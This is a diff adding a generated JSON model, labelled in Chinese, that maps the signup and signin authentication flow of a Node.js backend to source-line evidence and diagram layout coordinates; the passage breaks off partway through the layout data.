@@ -1,0 +1,2161 @@
+{
+  "schemaVersion": 1,
+  "generatedFrom": {
+    "repository": "git@github.com:santiq/bulletproof-nodejs.git",
+    "commit": "7ce1b4690c4e96659cb1ed0d367b08b3ab35a24b",
+    "providerVersion": "1.4.1"
+  },
+  "model": {
+    "schemaVersion": 1,
+    "featureTree": [
+      "auth",
+      "signup",
+      "signin"
+    ],
+    "objects": {
+      "auth": {
+        "id": "auth",
+        "kind": "capability",
+        "label": "身份认证",
+        "purpose": "接收注册或登录请求，并把凭据交给对应认证流程。",
+        "why": "让系统创建新账号或确认已有用户身份。",
+        "parentId": null,
+        "evidenceIds": [
+          "source-line:src/api/routes/auth.ts:12",
+          "source-line:src/api/routes/auth.ts:14",
+          "source-line:src/api/routes/auth.ts:37"
+        ]
+      },
+      "signup": {
+        "id": "signup",
+        "kind": "use-case",
+        "label": "注册用户",
+        "purpose": "验证注册输入、创建用户、生成 token，并触发注册后的动作。",
+        "why": "把新用户输入转换成可返回的账号和认证 token。",
+        "parentId": "auth",
+        "evidenceIds": [
+          "source-line:src/api/routes/auth.ts:15",
+          "source:src/services/auth.ts:21-74"
+        ]
+      },
+      "signup-input": {
+        "id": "signup-input",
+        "kind": "step",
+        "label": "接收注册资料",
+        "purpose": "接收 name、email 和 password，并把请求体作为 IUserInputDTO 传入 SignUp。",
+        "why": "SignUp 需要完整的新用户资料。",
+        "parentId": "signup",
+        "input": "HTTP request body",
+        "output": "IUserInputDTO",
+        "evidenceIds": [
+          "source-line:src/api/routes/auth.ts:17",
+          "source-line:src/api/routes/auth.ts:18",
+          "source-line:src/api/routes/auth.ts:19",
+          "source-line:src/api/routes/auth.ts:20",
+          "source-line:src/api/routes/auth.ts:28",
+          "codegraph-relation:134"
+        ]
+      },
+      "signup-route-validation": {
+        "id": "signup-route-validation",
+        "kind": "step",
+        "label": "校验注册请求字段",
+        "purpose": "要求 name、email 和 password 都是必填字符串。",
+        "why": "避免把缺少必要字段的请求交给注册服务。",
+        "parentId": "signup-input",
+        "input": "request body",
+        "output": "validated request body",
+        "evidenceIds": [
+          "source-line:src/api/routes/auth.ts:16",
+          "source-line:src/api/routes/auth.ts:17",
+          "source-line:src/api/routes/auth.ts:18",
+          "source-line:src/api/routes/auth.ts:19",
+          "source-line:src/api/routes/auth.ts:20",
+          "source-line:src/api/routes/auth.ts:21"
+        ]
+      },
+      "signup-route-call": {
+        "id": "signup-route-call",
+        "kind": "step",
+        "label": "调用 AuthService.SignUp",
+        "purpose": "从依赖注入容器取得 AuthService，并传入 IUserInputDTO。",
+        "why": "路由只负责 HTTP 边界，注册规则由 AuthService 执行。",
+        "parentId": "signup",
+        "input": "IUserInputDTO",
+        "output": "{ user, token } or error",
+        "evidenceIds": [
+          "source-line:src/api/routes/auth.ts:27",
+          "source-line:src/api/routes/auth.ts:28",
+          "codegraph-relation:134"
+        ]
+      },
+      "signup-hash": {
+        "id": "signup-hash",
+        "kind": "step",
+        "label": "加盐并哈希密码",
+        "purpose": "生成随机 salt，并调用 argon2.hash 处理输入密码。",
+        "why": "数据库记录不应直接保存用户输入的明文密码。",
+        "parentId": "signup",
+        "input": "userInputDTO.password",
+        "output": "salt + hashedPassword",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:23",
+          "source-line:src/services/auth.ts:42"
+        ]
+      },
+      "signup-create": {
+        "id": "signup-create",
+        "kind": "step",
+        "label": "创建用户记录",
+        "purpose": "把用户输入、salt 和哈希密码交给 userModel.create。",
+        "why": "注册需要持久化一个新的用户记录。",
+        "parentId": "signup",
+        "input": "IUserInputDTO + salt + hashedPassword",
+        "output": "userRecord",
+        "sideEffect": "请求 userModel 创建记录",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:44",
+          "source-line:src/services/auth.ts:45",
+          "source-line:src/services/auth.ts:46",
+          "source-line:src/services/auth.ts:47",
+          "source-line:src/services/auth.ts:48"
+        ]
+      },
+      "signup-token": {
+        "id": "signup-token",
+        "kind": "step",
+        "label": "生成注册 token",
+        "purpose": "把 userRecord 传给 generateToken。",
+        "why": "注册成功响应需要返回认证 token。",
+        "parentId": "signup",
+        "input": "userRecord",
+        "output": "token",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:50",
+          "codegraph-relation:191"
+        ]
+      },
+      "signup-record-guard": {
+        "id": "signup-record-guard",
+        "kind": "decision",
+        "label": "用户记录是否已创建",
+        "purpose": "检查 userRecord 是否存在。",
+        "why": "没有用户记录时不能把注册当作成功。",
+        "parentId": "signup",
+        "input": "userRecord",
+        "output": "created or missing",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:52"
+        ]
+      },
+      "signup-record-failure": {
+        "id": "signup-record-failure",
+        "kind": "result",
+        "outcome": "failure",
+        "label": "用户创建失败",
+        "purpose": "抛出 User cannot be created 错误。",
+        "why": "终止没有有效 userRecord 的注册流程。",
+        "parentId": "signup",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:52",
+          "source-line:src/services/auth.ts:53"
+        ]
+      },
+      "signup-welcome": {
+        "id": "signup-welcome",
+        "kind": "step",
+        "label": "请求发送欢迎邮件",
+        "purpose": "调用 MailerService.SendWelcomeEmail(userRecord)。",
+        "why": "注册流程包含欢迎邮件这个外部副作用。",
+        "parentId": "signup",
+        "input": "userRecord",
+        "output": "awaited completion",
+        "sideEffect": "调用仓库内 MailerService；实际邮件投递机制不在当前范围",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:56",
+          "codegraph-relation:192"
+        ]
+      },
+      "signup-dispatch": {
+        "id": "signup-dispatch",
+        "kind": "step",
+        "label": "分发注册事件",
+        "purpose": "分发 events.user.signUp，并把 userRecord 放入 payload。",
+        "why": "让已注册的订阅者收到注册完成信号。",
+        "parentId": "signup",
+        "input": "userRecord",
+        "output": "onUserSignUp event",
+        "sideEffect": "调用事件分发器",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:58",
+          "source-line:src/subscribers/events.ts:3"
+        ]
+      },
+      "signup-event": {
+        "id": "signup-event",
+        "kind": "event",
+        "label": "onUserSignUp",
+        "purpose": "表示源码声明并分发的用户注册事件。",
+        "why": "连接注册服务与注册事件订阅者。",
+        "parentId": "signup",
+        "input": "{ user: userRecord }",
+        "output": "registered handlers",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:58",
+          "source-line:src/subscribers/events.ts:3"
+        ]
+      },
+      "signup-handler": {
+        "id": "signup-handler",
+        "kind": "step",
+        "label": "已注册但未实现业务动作的处理器",
+        "purpose": "onUserSignUp 已通过装饰器注册，但函数体只有 TODO 和注释示例。",
+        "why": "明确事件有接收边界，同时防止把注释中的分析或邮件动作误认为已执行。",
+        "parentId": "signup",
+        "input": "{ name, email, _id }",
+        "output": "no implemented business action",
+        "evidenceIds": [
+          "source-line:src/subscribers/user.ts:36",
+          "source-line:src/subscribers/user.ts:37",
+          "source-line:src/subscribers/user.ts:42",
+          "source-line:src/subscribers/user.ts:46",
+          "source-line:src/subscribers/user.ts:48"
+        ]
+      },
+      "signup-sanitize": {
+        "id": "signup-sanitize",
+        "kind": "step",
+        "label": "移除敏感字段",
+        "purpose": "把 userRecord 转为普通对象，并删除 password 与 salt。",
+        "why": "响应不应把密码哈希和 salt 返回给调用方。",
+        "parentId": "signup",
+        "input": "userRecord",
+        "output": "user without password and salt",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:66",
+          "source-line:src/services/auth.ts:67",
+          "source-line:src/services/auth.ts:68"
+        ]
+      },
+      "signup-success": {
+        "id": "signup-success",
+        "kind": "result",
+        "outcome": "success",
+        "label": "注册成功",
+        "purpose": "返回已移除敏感字段的 user 和 token，HTTP 路由返回 201。",
+        "why": "把新账号与认证凭据交给请求方。",
+        "parentId": "signup",
+        "output": "HTTP 201 { user, token }",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:69",
+          "source-line:src/api/routes/auth.ts:29"
+        ]
+      },
+      "signup-error-forward": {
+        "id": "signup-error-forward",
+        "kind": "result",
+        "outcome": "failure",
+        "label": "注册错误交给 Express",
+        "purpose": "服务重新抛出错误后，路由捕获并调用 next(e)。",
+        "why": "由应用的错误处理中间件处理注册失败。",
+        "parentId": "signup",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:70",
+          "source-line:src/services/auth.ts:72",
+          "source-line:src/api/routes/auth.ts:30",
+          "source-line:src/api/routes/auth.ts:32"
+        ]
+      },
+      "signin": {
+        "id": "signin",
+        "kind": "use-case",
+        "label": "登录用户",
+        "purpose": "按 email 查找用户、验证密码，并返回用户和 token 或明确失败。",
+        "why": "只允许有效凭据获得认证结果。",
+        "parentId": "auth",
+        "evidenceIds": [
+          "source-line:src/api/routes/auth.ts:38",
+          "source:src/services/auth.ts:76-101"
+        ]
+      },
+      "signin-input": {
+        "id": "signin-input",
+        "kind": "step",
+        "label": "接收登录凭据",
+        "purpose": "要求 email 和 password，并传给 AuthService.SignIn。",
+        "why": "登录需要用这两个值查找用户并验证密码。",
+        "parentId": "signin",
+        "input": "HTTP request body",
+        "output": "email + password",
+        "evidenceIds": [
+          "source-line:src/api/routes/auth.ts:40",
+          "source-line:src/api/routes/auth.ts:41",
+          "source-line:src/api/routes/auth.ts:42",
+          "source-line:src/api/routes/auth.ts:49",
+          "source-line:src/api/routes/auth.ts:51",
+          "codegraph-relation:135"
+        ]
+      },
+      "signin-route-validation": {
+        "id": "signin-route-validation",
+        "kind": "step",
+        "label": "校验登录请求字段",
+        "purpose": "要求 email 和 password 都是必填字符串。",
+        "why": "避免把不完整凭据交给登录服务。",
+        "parentId": "signin-input",
+        "input": "request body",
+        "output": "validated credentials",
+        "evidenceIds": [
+          "source-line:src/api/routes/auth.ts:39",
+          "source-line:src/api/routes/auth.ts:40",
+          "source-line:src/api/routes/auth.ts:41",
+          "source-line:src/api/routes/auth.ts:42",
+          "source-line:src/api/routes/auth.ts:43"
+        ]
+      },
+      "signin-route-call": {
+        "id": "signin-route-call",
+        "kind": "step",
+        "label": "调用 AuthService.SignIn",
+        "purpose": "从容器取得 AuthService，并传入 email 与 password。",
+        "why": "把 HTTP 边界与登录规则分开。",
+        "parentId": "signin",
+        "input": "email + password",
+        "output": "{ user, token } or error",
+        "evidenceIds": [
+          "source-line:src/api/routes/auth.ts:49",
+          "source-line:src/api/routes/auth.ts:50",
+          "source-line:src/api/routes/auth.ts:51",
+          "codegraph-relation:135"
+        ]
+      },
+      "signin-find": {
+        "id": "signin-find",
+        "kind": "step",
+        "label": "按 email 查找用户",
+        "purpose": "调用 userModel.findOne({ email })。",
+        "why": "需要取得保存的密码哈希和用户信息。",
+        "parentId": "signin",
+        "input": "email",
+        "output": "userRecord or no record",
+        "sideEffect": "调用 userModel；数据库内部机制不在当前范围",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:77"
+        ]
+      },
+      "signin-user-guard": {
+        "id": "signin-user-guard",
+        "kind": "decision",
+        "label": "是否找到用户记录",
+        "purpose": "检查 userRecord 是否存在。",
+        "why": "不存在的账号不能进入密码验证。",
+        "parentId": "signin",
+        "input": "userRecord",
+        "output": "found or missing",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:78"
+        ]
+      },
+      "signin-missing": {
+        "id": "signin-missing",
+        "kind": "result",
+        "outcome": "failure",
+        "label": "用户不存在",
+        "purpose": "抛出 User not registered 错误。",
+        "why": "停止不存在账号的登录请求。",
+        "parentId": "signin",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:78",
+          "source-line:src/services/auth.ts:79"
+        ]
+      },
+      "signin-verify": {
+        "id": "signin-verify",
+        "kind": "step",
+        "label": "验证密码",
+        "purpose": "调用 argon2.verify 比较保存的密码值与输入密码。",
+        "why": "判断调用者是否提供了有效密码。",
+        "parentId": "signin",
+        "input": "userRecord.password + input password",
+        "output": "validPassword",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:85"
+        ]
+      },
+      "signin-password-guard": {
+        "id": "signin-password-guard",
+        "kind": "decision",
+        "label": "密码是否有效",
+        "purpose": "根据 validPassword 选择成功或失败路径。",
+        "why": "只有密码验证成功才能生成并返回 token。",
+        "parentId": "signin",
+        "input": "validPassword",
+        "output": "valid or invalid",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:86",
+          "source-line:src/services/auth.ts:98"
+        ]
+      },
+      "signin-token": {
+        "id": "signin-token",
+        "kind": "step",
+        "label": "生成登录 token",
+        "purpose": "在 validPassword 为 true 时调用 generateToken(userRecord)。",
+        "why": "成功登录响应需要认证 token。",
+        "parentId": "signin",
+        "input": "userRecord",
+        "output": "token",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:86",
+          "source-line:src/services/auth.ts:89",
+          "codegraph-relation:195"
+        ]
+      },
+      "signin-sanitize": {
+        "id": "signin-sanitize",
+        "kind": "step",
+        "label": "移除登录响应中的敏感字段",
+        "purpose": "把 userRecord 转为普通对象，并删除 password 与 salt。",
+        "why": "响应不应泄露保存的密码值和 salt。",
+        "parentId": "signin",
+        "input": "userRecord",
+        "output": "user without password and salt",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:91",
+          "source-line:src/services/auth.ts:92",
+          "source-line:src/services/auth.ts:93"
+        ]
+      },
+      "signin-success": {
+        "id": "signin-success",
+        "kind": "result",
+        "outcome": "success",
+        "label": "登录成功",
+        "purpose": "返回已移除敏感字段的 user 和 token，路由返回 JSON。",
+        "why": "把有效登录结果交给请求方。",
+        "parentId": "signin",
+        "output": "HTTP response { user, token }",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:97",
+          "source-line:src/api/routes/auth.ts:52"
+        ]
+      },
+      "signin-invalid": {
+        "id": "signin-invalid",
+        "kind": "result",
+        "outcome": "failure",
+        "label": "密码错误",
+        "purpose": "在 validPassword 为 false 时抛出 Invalid Password。",
+        "why": "拒绝密码不匹配的登录请求。",
+        "parentId": "signin",
+        "evidenceIds": [
+          "source-line:src/services/auth.ts:98",
+          "source-line:src/services/auth.ts:99"
+        ]
+      },
+      "signin-error-forward": {
+        "id": "signin-error-forward",
+        "kind": "step",
+        "label": "登录错误交给 Express",
+        "purpose": "路由捕获 SignIn 抛出的错误并调用 next(e)。",
+        "why": "由应用错误处理中间件处理登录失败。",
+        "parentId": "signin",
+        "evidenceIds": [
+          "source-line:src/api/routes/auth.ts:53",
+          "source-line:src/api/routes/auth.ts:55"
+        ]
+      }
+    },
+    "flow": {
+      "bands": {
+        "Z0": {
+          "nodes": [
+            {
+              "id": "z0-auth",
+              "semanticId": "auth",
+              "x": 40,
+              "y": 300,
+              "width": 210,
+              "height": 92,
+              "summaryOf": [
+                "signup-input",
+                "signin-input"
+              ]
+            },
+            {
+              "id": "z0-signup",
+              "semanticId": "signup",
+              "x": 340,
+              "y": 90,
+              "width": 220,
+              "height": 96,
+              "summaryOf": [
+                "signup-hash",
+                "signup-create",
+                "signup-token",
+                "signup-welcome",
+                "signup-sanitize"
+              ]
+            },
+            {
+              "id": "z0-signup-success",
+              "semanticId": "signup-success",
+              "x": 720,
+              "y": 30,
+              "width": 190,
+              "height": 78
+            },
+            {
+              "id": "z0-signup-error",
+              "semanticId": "signup-error-forward",
+              "x": 720,
+              "y": 140,
+              "width": 210,
+              "height": 78,
+              "summaryOf": [
+                "signup-record-failure"
+              ]
+            },
+            {
+              "id": "z0-signup-event",
+              "semanticId": "signup-event",
+              "x": 1010,
+              "y": 30,
+              "width": 190,
+              "height": 78,
+              "summaryOf": [
+                "signup-dispatch",
+                "signup-handler"
+              ]
+            },
+            {
+              "id": "z0-signin",
+              "semanticId": "signin",
+              "x": 340,
+              "y": 470,
+              "width": 220,
+              "height": 96,
+              "summaryOf": [
+                "signin-find",
+                "signin-verify",
+                "signin-sanitize"
+              ]
+            },
+            {
+              "id": "z0-signin-success",
+              "semanticId": "signin-success",
+              "x": 720,
+              "y": 390,
+              "width": 190,
+              "height": 78
+            },
+            {
+              "id": "z0-signin-missing",
+              "semanticId": "signin-missing",
+              "x": 720,
+              "y": 500,
+              "width": 190,
+              "height": 78
+            },
+            {
+              "id": "z0-signin-invalid",
+              "semanticId": "signin-invalid",
+              "x": 720,
+              "y": 610,
+              "width": 190,
+              "height": 78
+            }
+          ],
+          "edges": [
+            {
+              "id": "z0-signup-input",
+              "source": "z0-auth",
+              "target": "z0-signup",
+              "kind": "data",
+              "label": "SignupRequest { name, email, password }",
+              "evidenceIds": [
+                "source-line:src/api/routes/auth.ts:15",
+                "source-line:src/api/routes/auth.ts:28",
+                "codegraph-relation:134"
+              ]
+            },
+            {
+              "id": "z0-signup-ok",
+              "source": "z0-signup",
+              "target": "z0-signup-success",
+              "kind": "control",
+              "label": "注册完成",
+              "condition": "userRecord 存在且后续步骤未抛错",
+              "result": "HTTP 201 { user, token }",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:52",
+                "source-line:src/services/auth.ts:69",
+                "source-line:src/api/routes/auth.ts:29"
+              ]
+            },
+            {
+              "id": "z0-signup-fail",
+              "source": "z0-signup",
+              "target": "z0-signup-error",
+              "kind": "control",
+              "label": "注册任一步骤抛出错误",
+              "condition": "SignUp throws",
+              "result": "route calls next(e)",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:70",
+                "source-line:src/services/auth.ts:72",
+                "source-line:src/api/routes/auth.ts:30",
+                "source-line:src/api/routes/auth.ts:32"
+              ]
+            },
+            {
+              "id": "z0-signup-event-edge",
+              "source": "z0-signup",
+              "target": "z0-signup-event",
+              "kind": "event",
+              "label": "onUserSignUp { user: userRecord }",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:58",
+                "source-line:src/subscribers/events.ts:3"
+              ]
+            },
+            {
+              "id": "z0-signin-input",
+              "source": "z0-auth",
+              "target": "z0-signin",
+              "kind": "data",
+              "label": "SigninCredentials { email, password }",
+              "evidenceIds": [
+                "source-line:src/api/routes/auth.ts:38",
+                "source-line:src/api/routes/auth.ts:51",
+                "codegraph-relation:135"
+              ]
+            },
+            {
+              "id": "z0-signin-ok",
+              "source": "z0-signin",
+              "target": "z0-signin-success",
+              "kind": "control",
+              "label": "用户存在且密码有效",
+              "condition": "userRecord && validPassword",
+              "result": "return { user, token }",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:78",
+                "source-line:src/services/auth.ts:86",
+                "source-line:src/services/auth.ts:97"
+              ]
+            },
+            {
+              "id": "z0-signin-missing-edge",
+              "source": "z0-signin",
+              "target": "z0-signin-missing",
+              "kind": "control",
+              "label": "没有找到用户",
+              "condition": "!userRecord",
+              "result": "throw User not registered",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:78",
+                "source-line:src/services/auth.ts:79"
+              ]
+            },
+            {
+              "id": "z0-signin-invalid-edge",
+              "source": "z0-signin",
+              "target": "z0-signin-invalid",
+              "kind": "control",
+              "label": "密码验证失败",
+              "condition": "userRecord && !validPassword",
+              "result": "throw Invalid Password",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:85",
+                "source-line:src/services/auth.ts:98",
+                "source-line:src/services/auth.ts:99"
+              ]
+            }
+          ]
+        },
+        "Z1": {
+          "nodes": [
+            {
+              "id": "z1-signup-input",
+              "semanticId": "signup-input",
+              "x": 40,
+              "y": 100,
+              "width": 210,
+              "height": 84
+            },
+            {
+              "id": "z1-signup-hash",
+              "semanticId": "signup-hash",
+              "x": 320,
+              "y": 100,
+              "width": 210,
+              "height": 84
+            },
+            {
+              "id": "z1-signup-create",
+              "semanticId": "signup-create",
+              "x": 600,
+              "y": 100,
+              "width": 210,
+              "height": 84
+            },
+            {
+              "id": "z1-signup-token",
+              "semanticId": "signup-token",
+              "x": 880,
+              "y": 100,
+              "width": 210,
+              "height": 84
+            },
+            {
+              "id": "z1-signup-guard",
+              "semanticId": "signup-record-guard",
+              "x": 1160,
+              "y": 100,
+              "width": 210,
+              "height": 84
+            },
+            {
+              "id": "z1-signup-failure",
+              "semanticId": "signup-record-failure",
+              "x": 1440,
+              "y": 10,
+              "width": 200,
+              "height": 78
+            },
+            {
+              "id": "z1-signup-welcome",
+              "semanticId": "signup-welcome",
+              "x": 1440,
+              "y": 130,
+              "width": 210,
+              "height": 84
+            },
+            {
+              "id": "z1-signup-dispatch",
+              "semanticId": "signup-dispatch",
+              "x": 1720,
+              "y": 130,
+              "width": 210,
+              "height": 84
+            },
+            {
+              "id": "z1-signup-event",
+              "semanticId": "signup-event",
+              "x": 2000,
+              "y": 10,
+              "width": 200,
+              "height": 78
+            },
+            {
+              "id": "z1-signup-sanitize",
+              "semanticId": "signup-sanitize",
+              "x": 2000,
+              "y": 130,
+              "width": 210,
+              "height": 84
+            },
+            {
+              "id": "z1-signup-success",
+              "semanticId": "signup-success",
+              "x": 2280,
+              "y": 130,
+              "width": 200,
+              "height": 78
+            },
+            {
+              "id": "z1-signin-input",
+              "semanticId": "signin-input",
+              "x": 40,
+              "y": 650,
+              "width": 210,
+              "height": 84
+            },
+            {
+              "id": "z1-signin-find",
+              "semanticId": "signin-find",
+              "x": 320,
+              "y": 650,
+              "width": 210,
+              "height": 84
+            },
+            {
+              "id": "z1-signin-user-guard",
+              "semanticId": "signin-user-guard",
+              "x": 600,
+              "y": 650,
+              "width": 210,
+              "height": 84
+            },
+            {
+              "id": "z1-signin-missing",
+              "semanticId": "signin-missing",
+              "x": 880,
+              "y": 540,
+              "width": 200,
+              "height": 78
+            },
+            {
+              "id": "z1-signin-verify",
+              "semanticId": "signin-verify",
+              "x": 880,
+              "y": 680,
+              "width": 210,
+              "height": 84
+            },
+            {
+              "id": "z1-signin-password-guard",
+              "semanticId": "signin-password-guard",
+              "x": 1160,
+              "y": 680,
+              "width": 210,
+              "height": 84
+            },
+            {
+              "id": "z1-signin-invalid",
+              "semanticId": "signin-invalid",
+              "x": 1440,
+              "y": 570,
+              "width": 200,
+              "height": 78
+            },
+            {
+              "id": "z1-signin-token",
+              "semanticId": "signin-token",
+              "x": 1440,
+              "y": 710,
+              "width": 210,
+              "height": 84
+            },
+            {
+              "id": "z1-signin-sanitize",
+              "semanticId": "signin-sanitize",
+              "x": 1720,
+              "y": 710,
+              "width": 210,
+              "height": 84
+            },
+            {
+              "id": "z1-signin-success",
+              "semanticId": "signin-success",
+              "x": 2000,
+              "y": 710,
+              "width": 200,
+              "height": 78
+            }
+          ],
+          "edges": [
+            {
+              "id": "z1-signup-data-1",
+              "source": "z1-signup-input",
+              "target": "z1-signup-hash",
+              "kind": "data",
+              "label": "IUserInputDTO.password",
+              "evidenceIds": [
+                "source-line:src/api/routes/auth.ts:28",
+                "source-line:src/services/auth.ts:42",
+                "codegraph-relation:134"
+              ]
+            },
+            {
+              "id": "z1-signup-data-2",
+              "source": "z1-signup-hash",
+              "target": "z1-signup-create",
+              "kind": "data",
+              "label": "IUserInputDTO + salt + hashedPassword",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:42",
+                "source-line:src/services/auth.ts:44",
+                "source-line:src/services/auth.ts:47"
+              ]
+            },
+            {
+              "id": "z1-signup-data-3",
+              "source": "z1-signup-create",
+              "target": "z1-signup-token",
+              "kind": "data",
+              "label": "userRecord",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:44",
+                "source-line:src/services/auth.ts:50",
+                "codegraph-relation:191"
+              ]
+            },
+            {
+              "id": "z1-signup-control-guard",
+              "source": "z1-signup-token",
+              "target": "z1-signup-guard",
+              "kind": "control",
+              "label": "token 生成后检查记录",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:50",
+                "source-line:src/services/auth.ts:52"
+              ]
+            },
+            {
+              "id": "z1-signup-fail",
+              "source": "z1-signup-guard",
+              "target": "z1-signup-failure",
+              "kind": "control",
+              "label": "记录为空",
+              "condition": "!userRecord",
+              "result": "throw User cannot be created",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:52",
+                "source-line:src/services/auth.ts:53"
+              ]
+            },
+            {
+              "id": "z1-signup-continue",
+              "source": "z1-signup-guard",
+              "target": "z1-signup-welcome",
+              "kind": "control",
+              "label": "记录存在",
+              "condition": "userRecord",
+              "result": "继续注册副作用",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:52",
+                "source-line:src/services/auth.ts:56"
+              ]
+            },
+            {
+              "id": "z1-signup-welcome-dispatch",
+              "source": "z1-signup-welcome",
+              "target": "z1-signup-dispatch",
+              "kind": "data",
+              "label": "userRecord",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:56",
+                "source-line:src/services/auth.ts:58",
+                "codegraph-relation:192"
+              ]
+            },
+            {
+              "id": "z1-signup-event-edge",
+              "source": "z1-signup-dispatch",
+              "target": "z1-signup-event",
+              "kind": "event",
+              "label": "onUserSignUp { user: userRecord }",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:58",
+                "source-line:src/subscribers/events.ts:3"
+              ]
+            },
+            {
+              "id": "z1-signup-to-sanitize",
+              "source": "z1-signup-dispatch",
+              "target": "z1-signup-sanitize",
+              "kind": "control",
+              "label": "事件分发调用返回后继续",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:58",
+                "source-line:src/services/auth.ts:66"
+              ]
+            },
+            {
+              "id": "z1-signup-result",
+              "source": "z1-signup-sanitize",
+              "target": "z1-signup-success",
+              "kind": "data",
+              "label": "{ user without password/salt, token }",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:66",
+                "source-line:src/services/auth.ts:67",
+                "source-line:src/services/auth.ts:68",
+                "source-line:src/services/auth.ts:69"
+              ]
+            },
+            {
+              "id": "z1-signin-data-1",
+              "source": "z1-signin-input",
+              "target": "z1-signin-find",
+              "kind": "data",
+              "label": "email + password",
+              "evidenceIds": [
+                "source-line:src/api/routes/auth.ts:51",
+                "source-line:src/services/auth.ts:77",
+                "codegraph-relation:135"
+              ]
+            },
+            {
+              "id": "z1-signin-to-user-guard",
+              "source": "z1-signin-find",
+              "target": "z1-signin-user-guard",
+              "kind": "data",
+              "label": "userRecord or no record",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:77",
+                "source-line:src/services/auth.ts:78"
+              ]
+            },
+            {
+              "id": "z1-signin-missing-edge",
+              "source": "z1-signin-user-guard",
+              "target": "z1-signin-missing",
+              "kind": "control",
+              "label": "用户不存在",
+              "condition": "!userRecord",
+              "result": "throw User not registered",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:78",
+                "source-line:src/services/auth.ts:79"
+              ]
+            },
+            {
+              "id": "z1-signin-found",
+              "source": "z1-signin-user-guard",
+              "target": "z1-signin-verify",
+              "kind": "control",
+              "label": "找到用户",
+              "condition": "userRecord",
+              "result": "验证密码",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:78",
+                "source-line:src/services/auth.ts:85"
+              ]
+            },
+            {
+              "id": "z1-signin-verified",
+              "source": "z1-signin-verify",
+              "target": "z1-signin-password-guard",
+              "kind": "data",
+              "label": "validPassword",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:85",
+                "source-line:src/services/auth.ts:86"
+              ]
+            },
+            {
+              "id": "z1-signin-invalid-edge",
+              "source": "z1-signin-password-guard",
+              "target": "z1-signin-invalid",
+              "kind": "control",
+              "label": "密码无效",
+              "condition": "!validPassword",
+              "result": "throw Invalid Password",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:98",
+                "source-line:src/services/auth.ts:99"
+              ]
+            },
+            {
+              "id": "z1-signin-valid",
+              "source": "z1-signin-password-guard",
+              "target": "z1-signin-token",
+              "kind": "control",
+              "label": "密码有效",
+              "condition": "validPassword",
+              "result": "生成 token",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:86",
+                "source-line:src/services/auth.ts:89",
+                "codegraph-relation:195"
+              ]
+            },
+            {
+              "id": "z1-signin-token-data",
+              "source": "z1-signin-token",
+              "target": "z1-signin-sanitize",
+              "kind": "data",
+              "label": "userRecord + token",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:89",
+                "source-line:src/services/auth.ts:91"
+              ]
+            },
+            {
+              "id": "z1-signin-result",
+              "source": "z1-signin-sanitize",
+              "target": "z1-signin-success",
+              "kind": "data",
+              "label": "{ user without password/salt, token }",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:91",
+                "source-line:src/services/auth.ts:92",
+                "source-line:src/services/auth.ts:93",
+                "source-line:src/services/auth.ts:97"
+              ]
+            }
+          ]
+        },
+        "Z2": {
+          "nodes": [
+            {
+              "id": "z2-signup-validation",
+              "semanticId": "signup-route-validation",
+              "x": 40,
+              "y": 100,
+              "width": 220,
+              "height": 88
+            },
+            {
+              "id": "z2-signup-call",
+              "semanticId": "signup-route-call",
+              "x": 330,
+              "y": 100,
+              "width": 220,
+              "height": 88
+            },
+            {
+              "id": "z2-signup-hash",
+              "semanticId": "signup-hash",
+              "x": 620,
+              "y": 100,
+              "width": 220,
+              "height": 88
+            },
+            {
+              "id": "z2-signup-create",
+              "semanticId": "signup-create",
+              "x": 910,
+              "y": 100,
+              "width": 220,
+              "height": 88
+            },
+            {
+              "id": "z2-signup-token",
+              "semanticId": "signup-token",
+              "x": 1200,
+              "y": 100,
+              "width": 220,
+              "height": 88
+            },
+            {
+              "id": "z2-signup-guard",
+              "semanticId": "signup-record-guard",
+              "x": 1490,
+              "y": 100,
+              "width": 220,
+              "height": 88
+            },
+            {
+              "id": "z2-signup-failure",
+              "semanticId": "signup-record-failure",
+              "x": 1780,
+              "y": 0,
+              "width": 210,
+              "height": 80
+            },
+            {
+              "id": "z2-signup-welcome",
+              "semanticId": "signup-welcome",
+              "x": 1780,
+              "y": 140,
+              "width": 220,
+              "height": 88
+            },
+            {
+              "id": "z2-signup-dispatch",
+              "semanticId": "signup-dispatch",
+              "x": 2070,
+              "y": 140,
+              "width": 220,
+              "height": 88
+            },
+            {
+              "id": "z2-signup-handler",
+              "semanticId": "signup-handler",
+              "x": 2360,
+              "y": 0,
